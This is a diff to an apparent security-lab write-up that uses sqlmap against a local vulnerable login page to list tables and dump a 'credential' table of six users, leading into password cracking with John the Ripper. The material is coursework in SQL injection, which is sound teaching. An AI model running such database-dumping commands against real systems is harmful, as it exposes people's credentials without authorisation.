@@ -324,7 +324,7 @@ After a few minutes, the result is
 **Question 2**: Use sqlmap to get tables, users information
 **Answer 2**:
 
-To get tables in the database named `bWAPP`, we use
+To get tables in the database named `sqllab_users`, we use
 
 ```
  python sqlmap.py -u "http://localhost:3128/unsafe_home.php?username=alice&Password=seedalice" -D sqllab_users --tables
@@ -334,9 +334,9 @@ To get tables in the database named `bWAPP`, we use
 
 ![image](https://github.com/user-attachments/assets/5c0055f1-738a-46a4-ba1d-e34eb54536e2)
 
-There is 1 table: credentials
+There is 1 table: credential
 
-And to get user information, we will exploit the `credentials` talbes:
+And to get user information, we will exploit the `credential` talbes:
 
 ```
 python sqlmap.py -u "http://localhost:3128/unsafe_home.php?username=alice&Password=seedalice" -D sqllab_users -T credential --dump
@@ -348,7 +348,7 @@ python sqlmap.py -u "http://localhost:3128/unsafe_home.php?username=alice&Passwo
 ![image](https://github.com/user-attachments/assets/0c011e3b-07c6-4278-84c0-de52f87bcf39)
 
 
-**Conclusion**: there are 1 table named credential
+**Conclusion**: there are 1 table named credential, contains 6 users
 
 **Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
 **Answer 3**:
